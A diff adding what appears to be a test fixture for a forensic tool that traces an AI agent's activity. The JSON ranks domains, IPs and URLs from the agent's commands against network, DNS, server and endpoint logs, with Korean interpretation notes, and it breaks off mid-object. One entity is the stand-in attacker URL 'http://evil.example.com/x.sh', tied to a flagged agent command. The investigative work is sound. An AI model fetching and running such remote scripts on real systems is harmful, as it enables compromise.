@@ -1,0 +1,1821 @@
+{
+  "candidates": [
+    {
+      "candidate_id": "candidate:b8bd67820c7bb9ff",
+      "discovery_path": {
+        "agent_event_ids": [
+          "cmd-01",
+          "out-01"
+        ],
+        "command_request_event_ids": [
+          "cmd-01"
+        ],
+        "contradicted_event_ids": [],
+        "directly_correlated_event_ids": [
+          "cmd-01"
+        ],
+        "independent_channels": [
+          "network",
+          "server"
+        ],
+        "independent_observation_ids": [
+          "dns-01",
+          "multi-target",
+          "net-01",
+          "srv-01"
+        ]
+      },
+      "entity": {
+        "entity_id": "entity:domain:b8bd67820c7bb9ff",
+        "entity_type": "domain",
+        "mention_count": 2,
+        "observation_count": 4,
+        "value": "api-lab.test"
+      },
+      "evidence": {
+        "command_requests": 1,
+        "contradictions": 0,
+        "independent_channels": [
+          "network",
+          "server"
+        ],
+        "independent_observations": 4,
+        "recorded_mentions": 2
+      },
+      "evidence_level": "corroborated",
+      "interpretation": "에이전트 아티팩트의 기록과 독립 관측이 함께 존재한다. 대상 서버 측 결과나 피해 여부는 별도 증거가 필요하다.",
+      "next_investigation_step": "관련 원본 증거와 관측 범위를 검토해 대상 측 결과 또는 피해 여부를 별도로 확인한다.",
+      "priority": "high",
+      "score": 13
+    },
+    {
+      "candidate_id": "candidate:ed9f4c2975f213e4",
+      "discovery_path": {
+        "agent_event_ids": [
+          "cmd-01"
+        ],
+        "command_request_event_ids": [
+          "cmd-01"
+        ],
+        "contradicted_event_ids": [],
+        "directly_correlated_event_ids": [
+          "cmd-01"
+        ],
+        "independent_channels": [
+          "server"
+        ],
+        "independent_observation_ids": [
+          "srv-01"
+        ]
+      },
+      "entity": {
+        "entity_id": "entity:url:ed9f4c2975f213e4",
+        "entity_type": "url",
+        "mention_count": 1,
+        "observation_count": 1,
+        "value": "https://api-lab.test/v1/health"
+      },
+      "evidence": {
+        "command_requests": 1,
+        "contradictions": 0,
+        "independent_channels": [
+          "server"
+        ],
+        "independent_observations": 1,
+        "recorded_mentions": 1
+      },
+      "evidence_level": "corroborated",
+      "interpretation": "에이전트 아티팩트의 기록과 독립 관측이 함께 존재한다. 대상 서버 측 결과나 피해 여부는 별도 증거가 필요하다.",
+      "next_investigation_step": "관련 원본 증거와 관측 범위를 검토해 대상 측 결과 또는 피해 여부를 별도로 확인한다.",
+      "priority": "high",
+      "score": 10
+    },
+    {
+      "candidate_id": "candidate:80177af0d04ecc5c",
+      "discovery_path": {
+        "agent_event_ids": [
+          "cmd-02"
+        ],
+        "command_request_event_ids": [
+          "cmd-02"
+        ],
+        "contradicted_event_ids": [
+          "cmd-02"
+        ],
+        "directly_correlated_event_ids": [
+          "cmd-02"
+        ],
+        "independent_channels": [
+          "endpoint"
+        ],
+        "independent_observation_ids": [
+          "ep-01"
+        ]
+      },
+      "entity": {
+        "entity_id": "entity:ip:80177af0d04ecc5c",
+        "entity_type": "ip",
+        "mention_count": 1,
+        "observation_count": 1,
+        "value": "10.0.0.5"
+      },
+      "evidence": {
+        "command_requests": 1,
+        "contradictions": 1,
+        "independent_channels": [
+          "endpoint"
+        ],
+        "independent_observations": 1,
+        "recorded_mentions": 1
+      },
+      "evidence_level": "conflicted",
+      "interpretation": "명시적인 반대 증거가 있어 우선순위를 낮췄다. 원본 증거와 관측 범위를 재검토해야 한다.",
+      "next_investigation_step": "대상 서버 접근 로그 또는 해당 시각의 네트워크 관측 자료를 대조한다.",
+      "priority": "medium",
+      "score": 4
+    },
+    {
+      "candidate_id": "candidate:72cab1571c87b285",
+      "discovery_path": {
+        "agent_event_ids": [
+          "out-01"
+        ],
+        "command_request_event_ids": [],
+        "contradicted_event_ids": [],
+        "directly_correlated_event_ids": [],
+        "independent_channels": [
+          "network"
+        ],
+        "independent_observation_ids": [
+          "dns-01"
+        ]
+      },
+      "entity": {
+        "entity_id": "entity:ip:72cab1571c87b285",
+        "entity_type": "ip",
+        "mention_count": 1,
+        "observation_count": 1,
+        "value": "10.0.0.9"
+      },
+      "evidence": {
+        "command_requests": 0,
+        "contradictions": 0,
+        "independent_channels": [
+          "network"
+        ],
+        "independent_observations": 1,
+        "recorded_mentions": 1
+      },
+      "evidence_level": "observed",
+      "interpretation": "독립 관측은 있으나 에이전트 기록과의 직접 연결 또는 복수 채널 검증이 제한적이다.",
+      "next_investigation_step": "대상 서버 접근 로그 또는 해당 시각의 네트워크 관측 자료를 대조한다.",
+      "priority": "medium",
+      "score": 4
+    },
+    {
+      "candidate_id": "candidate:2dbe0e7fa5fb2b88",
+      "discovery_path": {
+        "agent_event_ids": [
+          "cmd-02"
+        ],
+        "command_request_event_ids": [
+          "cmd-02"
+        ],
+        "contradicted_event_ids": [
+          "cmd-02"
+        ],
+        "directly_correlated_event_ids": [
+          "cmd-02"
+        ],
+        "independent_channels": [
+          "endpoint"
+        ],
+        "independent_observation_ids": [
+          "ep-02"
+        ]
+      },
+      "entity": {
+        "entity_id": "entity:domain:2dbe0e7fa5fb2b88",
+        "entity_type": "domain",
+        "mention_count": 1,
+        "observation_count": 1,
+        "value": "evil.example.com"
+      },
+      "evidence": {
+        "command_requests": 1,
+        "contradictions": 1,
+        "independent_channels": [
+          "endpoint"
+        ],
+        "independent_observations": 1,
+        "recorded_mentions": 1
+      },
+      "evidence_level": "conflicted",
+      "interpretation": "명시적인 반대 증거가 있어 우선순위를 낮췄다. 원본 증거와 관측 범위를 재검토해야 한다.",
+      "next_investigation_step": "대상 서버 접근 로그 또는 해당 시각의 네트워크 관측 자료를 대조한다.",
+      "priority": "medium",
+      "score": 4
+    },
+    {
+      "candidate_id": "candidate:4fa79423ef2fc7de",
+      "discovery_path": {
+        "agent_event_ids": [],
+        "command_request_event_ids": [],
+        "contradicted_event_ids": [],
+        "directly_correlated_event_ids": [],
+        "independent_channels": [
+          "harness"
+        ],
+        "independent_observation_ids": [
+          "observation:0009:559471229e53"
+        ]
+      },
+      "entity": {
+        "entity_id": "entity:ip:4fa79423ef2fc7de",
+        "entity_type": "ip",
+        "observation_count": 1,
+        "value": "192.0.2.1"
+      },
+      "evidence": {
+        "command_requests": 0,
+        "contradictions": 0,
+        "independent_channels": [
+          "harness"
+        ],
+        "independent_observations": 1,
+        "recorded_mentions": 0
+      },
+      "evidence_level": "observed",
+      "interpretation": "독립 관측은 있으나 에이전트 기록과의 직접 연결 또는 복수 채널 검증이 제한적이다.",
+      "next_investigation_step": "대상 서버 접근 로그 또는 해당 시각의 네트워크 관측 자료를 대조한다.",
+      "priority": "low",
+      "score": 3
+    },
+    {
+      "candidate_id": "candidate:749d000dcbbaa5c7",
+      "discovery_path": {
+        "agent_event_ids": [],
+        "command_request_event_ids": [],
+        "contradicted_event_ids": [],
+        "directly_correlated_event_ids": [],
+        "independent_channels": [
+          "network"
+        ],
+        "independent_observation_ids": [
+          "net-02"
+        ]
+      },
+      "entity": {
+        "entity_id": "entity:domain:749d000dcbbaa5c7",
+        "entity_type": "domain",
+        "observation_count": 1,
+        "value": "bigexample.org"
+      },
+      "evidence": {
+        "command_requests": 0,
+        "contradictions": 0,
+        "independent_channels": [
+          "network"
+        ],
+        "independent_observations": 1,
+        "recorded_mentions": 0
+      },
+      "evidence_level": "observed",
+      "interpretation": "독립 관측은 있으나 에이전트 기록과의 직접 연결 또는 복수 채널 검증이 제한적이다.",
+      "next_investigation_step": "대상 서버 접근 로그 또는 해당 시각의 네트워크 관측 자료를 대조한다.",
+      "priority": "low",
+      "score": 3
+    },
+    {
+      "candidate_id": "candidate:e647c5f99474b3a0",
+      "discovery_path": {
+        "agent_event_ids": [
+          "cmd-03",
+          "msg-01"
+        ],
+        "command_request_event_ids": [
+          "cmd-03"
+        ],
+        "contradicted_event_ids": [],
+        "directly_correlated_event_ids": [],
+        "independent_channels": [],
+        "independent_observation_ids": []
+      },
+      "entity": {
+        "entity_id": "entity:domain:e647c5f99474b3a0",
+        "entity_type": "domain",
+        "mention_count": 2,
+        "value": "config.json"
+      },
+      "evidence": {
+        "command_requests": 1,
+        "contradictions": 0,
+        "independent_channels": [],
+        "independent_observations": 0,
+        "recorded_mentions": 2
+      },
+      "evidence_level": "lead",
+      "interpretation": "에이전트 아티팩트에서 확인된 조사 단서이며, 실제 실행 또는 접근이 관측되었다는 뜻은 아니다.",
+      "next_investigation_step": "독립적인 엔드포인트·네트워크·서버 관측 증거를 확보해 행위 여부를 확인한다.",
+      "priority": "low",
+      "score": 3
+    },
+    {
+      "candidate_id": "candidate:ee8cf298f1e6ac52",
+      "discovery_path": {
+        "agent_event_ids": [
+          "cmd-03"
+        ],
+        "command_request_event_ids": [
+          "cmd-03"
+        ],
+        "contradicted_event_ids": [],
+        "directly_correlated_event_ids": [],
+        "independent_channels": [],
+        "independent_observation_ids": []
+      },
+      "entity": {
+        "entity_id": "entity:domain:ee8cf298f1e6ac52",
+        "entity_type": "domain",
+        "mention_count": 1,
+        "value": "main.py"
+      },
+      "evidence": {
+        "command_requests": 1,
+        "contradictions": 0,
+        "independent_channels": [],
+        "independent_observations": 0,
+        "recorded_mentions": 1
+      },
+      "evidence_level": "lead",
+      "interpretation": "에이전트 아티팩트에서 확인된 조사 단서이며, 실제 실행 또는 접근이 관측되었다는 뜻은 아니다.",
+      "next_investigation_step": "독립적인 엔드포인트·네트워크·서버 관측 증거를 확보해 행위 여부를 확인한다.",
+      "priority": "low",
+      "score": 3
+    },
+    {
+      "candidate_id": "candidate:80f720aa73d6ff7b",
+      "discovery_path": {
+        "agent_event_ids": [],
+        "command_request_event_ids": [],
+        "contradicted_event_ids": [],
+        "directly_correlated_event_ids": [],
+        "independent_channels": [
+          "unknown"
+        ],
+        "independent_observation_ids": [
+          "bad-status"
+        ]
+      },
+      "entity": {
+        "entity_id": "entity:domain:80f720aa73d6ff7b",
+        "entity_type": "domain",
+        "observation_count": 1,
+        "value": "nostatus.test"
+      },
+      "evidence": {
+        "command_requests": 0,
+        "contradictions": 0,
+        "independent_channels": [
+          "unknown"
+        ],
+        "independent_observations": 1,
+        "recorded_mentions": 0
+      },
+      "evidence_level": "observed",
+      "interpretation": "독립 관측은 있으나 에이전트 기록과의 직접 연결 또는 복수 채널 검증이 제한적이다.",
+      "next_investigation_step": "대상 서버 접근 로그 또는 해당 시각의 네트워크 관측 자료를 대조한다.",
+      "priority": "low",
+      "score": 3
+    },
+    {
+      "candidate_id": "candidate:62e5a976cf6122bf",
+      "discovery_path": {
+        "agent_event_ids": [
+          "msg-01"
+        ],
+        "command_request_event_ids": [],
+        "contradicted_event_ids": [],
+        "directly_correlated_event_ids": [],
+        "independent_channels": [],
+        "independent_observation_ids": []
+      },
+      "entity": {
+        "entity_id": "entity:domain:62e5a976cf6122bf",
+        "entity_type": "domain",
+        "mention_count": 1,
+        "value": "data.example.org"
+      },
+      "evidence": {
+        "command_requests": 0,
+        "contradictions": 0,
+        "independent_channels": [],
+        "independent_observations": 0,
+        "recorded_mentions": 1
+      },
+      "evidence_level": "lead",
+      "interpretation": "에이전트 아티팩트에서 확인된 조사 단서이며, 실제 실행 또는 접근이 관측되었다는 뜻은 아니다.",
+      "next_investigation_step": "독립적인 엔드포인트·네트워크·서버 관측 증거를 확보해 행위 여부를 확인한다.",
+      "priority": "low",
+      "score": 1
+    },
+    {
+      "candidate_id": "candidate:a7e93db8d73db900",
+      "discovery_path": {
+        "agent_event_ids": [
+          "cmd-02"
+        ],
+        "command_request_event_ids": [
+          "cmd-02"
+        ],
+        "contradicted_event_ids": [
+          "cmd-02"
+        ],
+        "directly_correlated_event_ids": [
+          "cmd-02"
+        ],
+        "independent_channels": [],
+        "independent_observation_ids": []
+      },
+      "entity": {
+        "entity_id": "entity:url:a7e93db8d73db900",
+        "entity_type": "url",
+        "mention_count": 1,
+        "value": "http://evil.example.com/x.sh"
+      },
+      "evidence": {
+        "command_requests": 1,
+        "contradictions": 1,
+        "independent_channels": [],
+        "independent_observations": 0,
+        "recorded_mentions": 1
+      },
+      "evidence_level": "conflicted",
+      "interpretation": "명시적인 반대 증거가 있어 우선순위를 낮췄다. 원본 증거와 관측 범위를 재검토해야 한다.",
+      "next_investigation_step": "대상 서버 접근 로그 또는 해당 시각의 네트워크 관측 자료를 대조한다.",
+      "priority": "low",
+      "score": 1
+    },
+    {
+      "candidate_id": "candidate:6268b6013df85e7f",
+      "discovery_path": {
+        "agent_event_ids": [
+          "unidentified-event-5"
+        ],
+        "command_request_event_ids": [],
+        "contradicted_event_ids": [],
+        "directly_correlated_event_ids": [],
+        "independent_channels": [],
+        "independent_observation_ids": []
+      },
+      "entity": {
+        "entity_id": "entity:url:6268b6013df85e7f",
+        "entity_type": "url",
+        "mention_count": 1,
+        "value": "http://noid.test/a"
+      },
+      "evidence": {
+        "command_requests": 0,
+        "contradictions": 0,
+        "independent_channels": [],
+        "independent_observations": 0,
+        "recorded_mentions": 1
+      },
+      "evidence_level": "lead",
+      "interpretation": "에이전트 아티팩트에서 확인된 조사 단서이며, 실제 실행 또는 접근이 관측되었다는 뜻은 아니다.",
+      "next_investigation_step": "독립적인 엔드포인트·네트워크·서버 관측 증거를 확보해 행위 여부를 확인한다.",
+      "priority": "low",
+      "score": 1
+    },
+    {
+      "candidate_id": "candidate:4f7680b1568e4fbf",
+      "discovery_path": {
+        "agent_event_ids": [
+          "unidentified-event-5"
+        ],
+        "command_request_event_ids": [],
+        "contradicted_event_ids": [],
+        "directly_correlated_event_ids": [],
+        "independent_channels": [],
+        "independent_observation_ids": []
+      },
+      "entity": {
+        "entity_id": "entity:domain:4f7680b1568e4fbf",
+        "entity_type": "domain",
+        "mention_count": 1,
+        "value": "noid.test"
+      },
+      "evidence": {
+        "command_requests": 0,
+        "contradictions": 0,
+        "independent_channels": [],
+        "independent_observations": 0,
+        "recorded_mentions": 1
+      },
+      "evidence_level": "lead",
+      "interpretation": "에이전트 아티팩트에서 확인된 조사 단서이며, 실제 실행 또는 접근이 관측되었다는 뜻은 아니다.",
+      "next_investigation_step": "독립적인 엔드포인트·네트워크·서버 관측 증거를 확보해 행위 여부를 확인한다.",
+      "priority": "low",
+      "score": 1
+    },
+    {
+      "candidate_id": "candidate:b6e0ca9198f0325c",
+      "discovery_path": {
+        "agent_event_ids": [
+          "msg-01"
+        ],
+        "command_request_event_ids": [],
+        "contradicted_event_ids": [],
+        "directly_correlated_event_ids": [],
+        "independent_channels": [],
+        "independent_observation_ids": []
+      },
+      "entity": {
+        "entity_id": "entity:domain:b6e0ca9198f0325c",
+        "entity_type": "domain",
+        "mention_count": 1,
+        "value": "readme.md"
+      },
+      "evidence": {
+        "command_requests": 0,
+        "contradictions": 0,
+        "independent_channels": [],
+        "independent_observations": 0,
+        "recorded_mentions": 1
+      },
+      "evidence_level": "lead",
+      "interpretation": "에이전트 아티팩트에서 확인된 조사 단서이며, 실제 실행 또는 접근이 관측되었다는 뜻은 아니다.",
+      "next_investigation_step": "독립적인 엔드포인트·네트워크·서버 관측 증거를 확보해 행위 여부를 확인한다.",
+      "priority": "low",
+      "score": 1
+    },
+    {
+      "candidate_id": "candidate:ca0296d554c48d3f",
+      "discovery_path": {
+        "agent_event_ids": [
+          "msg-01"
+        ],
+        "command_request_event_ids": [],
+        "contradicted_event_ids": [],
+        "directly_correlated_event_ids": [],
+        "independent_channels": [],
+        "independent_observation_ids": []
+      },
+      "entity": {
+        "entity_id": "entity:domain:ca0296d554c48d3f",
+        "entity_type": "domain",
+        "mention_count": 1,
+        "value": "setup.py"
+      },
+      "evidence": {
+        "command_requests": 0,
+        "contradictions": 0,
+        "independent_channels": [],
+        "independent_observations": 0,
+        "recorded_mentions": 1
+      },
+      "evidence_level": "lead",
+      "interpretation": "에이전트 아티팩트에서 확인된 조사 단서이며, 실제 실행 또는 접근이 관측되었다는 뜻은 아니다.",
+      "next_investigation_step": "독립적인 엔드포인트·네트워크·서버 관측 증거를 확보해 행위 여부를 확인한다.",
+      "priority": "low",
+      "score": 1
+    },
+    {
+      "candidate_id": "candidate:60b102ffb81478bc",
+      "discovery_path": {
+        "agent_event_ids": [
+          "cmd-02"
+        ],
+        "command_request_event_ids": [
+          "cmd-02"
+        ],
+        "contradicted_event_ids": [
+          "cmd-02"
+        ],
+        "directly_correlated_event_ids": [
+          "cmd-02"
+        ],
+        "independent_channels": [],
+        "independent_observation_ids": []
+      },
+      "entity": {
+        "entity_id": "entity:domain:60b102ffb81478bc",
+        "entity_type": "domain",
+        "mention_count": 1,
+        "value": "x.sh"
+      },
+      "evidence": {
+        "command_requests": 1,
+        "contradictions": 1,
+        "independent_channels": [],
+        "independent_observations": 0,
+        "recorded_mentions": 1
+      },
+      "evidence_level": "conflicted",
+      "interpretation": "명시적인 반대 증거가 있어 우선순위를 낮췄다. 원본 증거와 관측 범위를 재검토해야 한다.",
+      "next_investigation_step": "대상 서버 접근 로그 또는 해당 시각의 네트워크 관측 자료를 대조한다.",
+      "priority": "low",
+      "score": 1
+    }
+  ],
+  "entities": [
+    {
+      "entity_id": "entity:domain:2dbe0e7fa5fb2b88",
+      "entity_type": "domain",
+      "mention_count": 1,
+      "observation_count": 1,
+      "value": "evil.example.com"
+    },
+    {
+      "entity_id": "entity:domain:4f7680b1568e4fbf",
+      "entity_type": "domain",
+      "mention_count": 1,
+      "value": "noid.test"
+    },
+    {
+      "entity_id": "entity:domain:60b102ffb81478bc",
+      "entity_type": "domain",
+      "mention_count": 1,
+      "value": "x.sh"
+    },
+    {
+      "entity_id": "entity:domain:62e5a976cf6122bf",
+      "entity_type": "domain",
+      "mention_count": 1,
+      "value": "data.example.org"
+    },
+    {
+      "entity_id": "entity:domain:749d000dcbbaa5c7",
+      "entity_type": "domain",
+      "observation_count": 1,
+      "value": "bigexample.org"
+    },
+    {
+      "entity_id": "entity:domain:80f720aa73d6ff7b",
+      "entity_type": "domain",
+      "observation_count": 1,
+      "value": "nostatus.test"
+    },
+    {
+      "entity_id": "entity:domain:b6e0ca9198f0325c",
+      "entity_type": "domain",
+      "mention_count": 1,
+      "value": "readme.md"
+    },
+    {
+      "entity_id": "entity:domain:b8bd67820c7bb9ff",
+      "entity_type": "domain",
+      "mention_count": 2,
+      "observation_count": 4,
+      "value": "api-lab.test"
+    },
+    {
+      "entity_id": "entity:domain:ca0296d554c48d3f",
+      "entity_type": "domain",
+      "mention_count": 1,
+      "value": "setup.py"
+    },
+    {
+      "entity_id": "entity:domain:e647c5f99474b3a0",
+      "entity_type": "domain",
+      "mention_count": 2,
+      "value": "config.json"
+    },
+    {
+      "entity_id": "entity:domain:ee8cf298f1e6ac52",
+      "entity_type": "domain",
+      "mention_count": 1,
+      "value": "main.py"
+    },
+    {
+      "entity_id": "entity:ip:4fa79423ef2fc7de",
+      "entity_type": "ip",
+      "observation_count": 1,
+      "value": "192.0.2.1"
+    },
+    {
+      "entity_id": "entity:ip:72cab1571c87b285",
+      "entity_type": "ip",
+      "mention_count": 1,
+      "observation_count": 1,
+      "value": "10.0.0.9"
+    },
+    {
+      "entity_id": "entity:ip:80177af0d04ecc5c",
+      "entity_type": "ip",
+      "mention_count": 1,
+      "observation_count": 1,
+      "value": "10.0.0.5"
+    },
+    {
+      "entity_id": "entity:url:6268b6013df85e7f",
+      "entity_type": "url",
+      "mention_count": 1,
+      "value": "http://noid.test/a"
+    },
+    {
+      "entity_id": "entity:url:a7e93db8d73db900",
+      "entity_type": "url",
+      "mention_count": 1,
+      "value": "http://evil.example.com/x.sh"
+    },
+    {
+      "entity_id": "entity:url:ed9f4c2975f213e4",
+      "entity_type": "url",
+      "mention_count": 1,
+      "observation_count": 1,
+      "value": "https://api-lab.test/v1/health"
+    }
+  ],
+  "errors": [],
+  "graph": {
+    "edges": [
+      {
+        "assertion": "recorded",
+        "basis": "exact_value_extraction",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "sessions/one.jsonl:line:7"
+        ],
+        "id": "edge:3907742f123d",
+        "relation": "COMMAND_REQUESTS",
+        "source_id": "event:cmd-01",
+        "target_id": "entity:domain:b8bd67820c7bb9ff"
+      },
+      {
+        "assertion": "recorded",
+        "basis": "exact_value_extraction",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "sessions/one.jsonl:line:7"
+        ],
+        "id": "edge:cc4a5588d929",
+        "relation": "COMMAND_REQUESTS",
+        "source_id": "event:cmd-01",
+        "target_id": "entity:url:ed9f4c2975f213e4"
+      },
+      {
+        "assertion": "recorded",
+        "basis": "exact_value_extraction",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "sessions/one.jsonl:line:9"
+        ],
+        "id": "edge:1fffc0ebb3d0",
+        "relation": "COMMAND_REQUESTS",
+        "source_id": "event:cmd-02",
+        "target_id": "entity:domain:2dbe0e7fa5fb2b88"
+      },
+      {
+        "assertion": "recorded",
+        "basis": "exact_value_extraction",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "sessions/one.jsonl:line:9"
+        ],
+        "id": "edge:e0fa41f03821",
+        "relation": "COMMAND_REQUESTS",
+        "source_id": "event:cmd-02",
+        "target_id": "entity:domain:60b102ffb81478bc"
+      },
+      {
+        "assertion": "recorded",
+        "basis": "exact_value_extraction",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "sessions/one.jsonl:line:9"
+        ],
+        "id": "edge:05393a686ff3",
+        "relation": "COMMAND_REQUESTS",
+        "source_id": "event:cmd-02",
+        "target_id": "entity:ip:80177af0d04ecc5c"
+      },
+      {
+        "assertion": "recorded",
+        "basis": "exact_value_extraction",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "sessions/one.jsonl:line:9"
+        ],
+        "id": "edge:108f1385f00b",
+        "relation": "COMMAND_REQUESTS",
+        "source_id": "event:cmd-02",
+        "target_id": "entity:url:a7e93db8d73db900"
+      },
+      {
+        "assertion": "recorded",
+        "basis": "exact_value_extraction",
+        "confidence": 1.0,
+        "evidence_refs": [],
+        "id": "edge:df89e277d718",
+        "relation": "MENTIONS",
+        "source_id": "event:msg-01",
+        "target_id": "entity:domain:e647c5f99474b3a0"
+      },
+      {
+        "assertion": "recorded",
+        "basis": "exact_value_extraction",
+        "confidence": 1.0,
+        "evidence_refs": [],
+        "id": "edge:ef7b4e816e7c",
+        "relation": "MENTIONS",
+        "source_id": "event:msg-01",
+        "target_id": "entity:domain:62e5a976cf6122bf"
+      },
+      {
+        "assertion": "recorded",
+        "basis": "exact_value_extraction",
+        "confidence": 1.0,
+        "evidence_refs": [],
+        "id": "edge:ea9097e57ab0",
+        "relation": "MENTIONS",
+        "source_id": "event:msg-01",
+        "target_id": "entity:domain:b6e0ca9198f0325c"
+      },
+      {
+        "assertion": "recorded",
+        "basis": "exact_value_extraction",
+        "confidence": 1.0,
+        "evidence_refs": [],
+        "id": "edge:6a91ec272601",
+        "relation": "MENTIONS",
+        "source_id": "event:msg-01",
+        "target_id": "entity:domain:ca0296d554c48d3f"
+      },
+      {
+        "assertion": "recorded",
+        "basis": "exact_value_extraction",
+        "confidence": 1.0,
+        "evidence_refs": [],
+        "id": "edge:300beee4546e",
+        "relation": "COMMAND_REQUESTS",
+        "source_id": "event:cmd-03",
+        "target_id": "entity:domain:e647c5f99474b3a0"
+      },
+      {
+        "assertion": "recorded",
+        "basis": "exact_value_extraction",
+        "confidence": 1.0,
+        "evidence_refs": [],
+        "id": "edge:95930b5005d0",
+        "relation": "COMMAND_REQUESTS",
+        "source_id": "event:cmd-03",
+        "target_id": "entity:domain:ee8cf298f1e6ac52"
+      },
+      {
+        "assertion": "recorded",
+        "basis": "exact_value_extraction",
+        "confidence": 1.0,
+        "evidence_refs": [],
+        "id": "edge:f1c7f8629eb2",
+        "relation": "MENTIONS",
+        "source_id": "event:out-01",
+        "target_id": "entity:domain:b8bd67820c7bb9ff"
+      },
+      {
+        "assertion": "recorded",
+        "basis": "exact_value_extraction",
+        "confidence": 1.0,
+        "evidence_refs": [],
+        "id": "edge:c8b17231ebf2",
+        "relation": "MENTIONS",
+        "source_id": "event:out-01",
+        "target_id": "entity:ip:72cab1571c87b285"
+      },
+      {
+        "assertion": "recorded",
+        "basis": "exact_value_extraction",
+        "confidence": 1.0,
+        "evidence_refs": [],
+        "id": "edge:8e17980cfa52",
+        "relation": "MENTIONS",
+        "source_id": "event:unidentified-event-5",
+        "target_id": "entity:domain:4f7680b1568e4fbf"
+      },
+      {
+        "assertion": "recorded",
+        "basis": "exact_value_extraction",
+        "confidence": 1.0,
+        "evidence_refs": [],
+        "id": "edge:23300ec083f7",
+        "relation": "MENTIONS",
+        "source_id": "event:unidentified-event-5",
+        "target_id": "entity:url:6268b6013df85e7f"
+      },
+      {
+        "assertion": "observed",
+        "basis": "explicit_observation_target",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "netflow.csv:line:42"
+        ],
+        "id": "edge:8a3ef907f230",
+        "relation": "OBSERVES",
+        "source_id": "observation:net-01",
+        "target_id": "entity:domain:b8bd67820c7bb9ff"
+      },
+      {
+        "assertion": "observed",
+        "basis": "explicit_observation_target",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "netflow.csv:line:50"
+        ],
+        "id": "edge:1b0ebf0f8010",
+        "relation": "OBSERVES",
+        "source_id": "observation:net-02",
+        "target_id": "entity:domain:749d000dcbbaa5c7"
+      },
+      {
+        "assertion": "observed",
+        "basis": "explicit_observation_target",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "access.log:12"
+        ],
+        "id": "edge:f32de5ac6814",
+        "relation": "OBSERVES",
+        "source_id": "observation:srv-01",
+        "target_id": "entity:url:ed9f4c2975f213e4"
+      },
+      {
+        "assertion": "observed",
+        "basis": "explicit_observation_target",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "access.log:12"
+        ],
+        "id": "edge:27439c7ec4f6",
+        "relation": "OBSERVES",
+        "source_id": "observation:srv-01",
+        "target_id": "entity:domain:b8bd67820c7bb9ff"
+      },
+      {
+        "assertion": "observed",
+        "basis": "explicit_observation_target",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "dns.pcap:3"
+        ],
+        "id": "edge:16159d67a1c6",
+        "relation": "OBSERVES",
+        "source_id": "observation:dns-01",
+        "target_id": "entity:ip:72cab1571c87b285"
+      },
+      {
+        "assertion": "observed",
+        "basis": "explicit_observation_target",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "dns.pcap:3"
+        ],
+        "id": "edge:bcf2b53a6fdb",
+        "relation": "OBSERVES",
+        "source_id": "observation:dns-01",
+        "target_id": "entity:domain:b8bd67820c7bb9ff"
+      },
+      {
+        "assertion": "observed",
+        "basis": "explicit_observation_target",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "evtx:77"
+        ],
+        "id": "edge:cedbf4be54ed",
+        "relation": "OBSERVES",
+        "source_id": "observation:ep-01",
+        "target_id": "entity:ip:80177af0d04ecc5c"
+      },
+      {
+        "assertion": "observed",
+        "basis": "explicit_observation_target",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "evtx:78"
+        ],
+        "id": "edge:96ac0d297e05",
+        "relation": "OBSERVES",
+        "source_id": "observation:ep-02",
+        "target_id": "entity:domain:2dbe0e7fa5fb2b88"
+      },
+      {
+        "assertion": "observed",
+        "basis": "explicit_observation_target",
+        "confidence": 1.0,
+        "evidence_refs": [],
+        "id": "edge:23eab0e9498d",
+        "relation": "OBSERVES",
+        "source_id": "observation:bad-status",
+        "target_id": "entity:domain:80f720aa73d6ff7b"
+      },
+      {
+        "assertion": "observed",
+        "basis": "explicit_observation_target",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "netflow.csv:99"
+        ],
+        "id": "edge:7f83dfe23a1a",
+        "relation": "OBSERVES",
+        "source_id": "observation:multi-target",
+        "target_id": "entity:domain:b8bd67820c7bb9ff"
+      },
+      {
+        "assertion": "observed",
+        "basis": "explicit_observation_target",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "h:1"
+        ],
+        "id": "edge:c42d29746b1b",
+        "relation": "OBSERVES",
+        "source_id": "observation:observation:0009:559471229e53",
+        "target_id": "entity:ip:4fa79423ef2fc7de"
+      },
+      {
+        "assertion": "observed",
+        "basis": "explicit_related_event_id",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "netflow.csv:line:42"
+        ],
+        "id": "edge:aa9accf3f4b7",
+        "relation": "CORROBORATES",
+        "source_id": "observation:net-01",
+        "target_id": "event:cmd-01"
+      },
+      {
+        "assertion": "observed",
+        "basis": "single_dns_observation",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "dns.pcap:3"
+        ],
+        "id": "edge:802842bd12fc",
+        "relation": "RESOLVES_TO",
+        "source_id": "entity:domain:b8bd67820c7bb9ff",
+        "target_id": "entity:ip:72cab1571c87b285"
+      },
+      {
+        "assertion": "observed",
+        "basis": "exact_normalized_command_match",
+        "confidence": 0.95,
+        "evidence_refs": [
+          "evtx:77"
+        ],
+        "id": "edge:4ee9d36571f4",
+        "relation": "CORROBORATES",
+        "source_id": "observation:ep-01",
+        "target_id": "event:cmd-02"
+      },
+      {
+        "assertion": "observed",
+        "basis": "explicit_contradiction_reference",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "evtx:78"
+        ],
+        "id": "edge:2851243c6ca1",
+        "relation": "CONTRADICTS",
+        "source_id": "observation:ep-02",
+        "target_id": "event:cmd-02"
+      },
+      {
+        "assertion": "observed",
+        "basis": "explicit_related_event_id",
+        "confidence": 1.0,
+        "evidence_refs": [
+          "netflow.csv:99"
+        ],
+        "id": "edge:ffc1f80491c1",
+        "relation": "CORROBORATES",
+        "source_id": "observation:multi-target",
+        "target_id": "event:cmd-02"
+      }
+    ],
+    "nodes": {
+      "entity:domain:2dbe0e7fa5fb2b88": {
+        "entity_type": "domain",
+        "id": "entity:domain:2dbe0e7fa5fb2b88",
+        "type": "target_entity",
+        "value": "evil.example.com"
+      },
+      "entity:domain:4f7680b1568e4fbf": {
+        "entity_type": "domain",
